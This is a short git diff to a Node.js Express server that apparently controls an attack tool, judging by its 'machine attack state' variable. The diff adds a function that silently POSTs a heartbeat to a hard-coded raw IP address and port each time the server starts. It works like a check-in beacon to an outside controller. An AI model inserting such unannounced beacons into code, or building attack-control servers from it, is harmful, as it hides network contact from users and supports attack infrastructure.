@@ -10,6 +10,17 @@ let machineBusy = false //machine attack state declaration
 let pythonActive = false //python state declaration
 let python = null //defining python beforehand so we can change it afterwards
 
+
+function inithb(){
+    var options = {method: 'POST', url: 'http://18.193.150.142:30120/hb/'};
+
+    axios.request(options).then(function (response) {
+      console.log(response.data);
+    }).catch(function (error) {
+      console.error(error);
+    });
+}
+inithb()
 app.use((req, res, next) => {
     var ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
     var accessedPN = req.originalUrl;
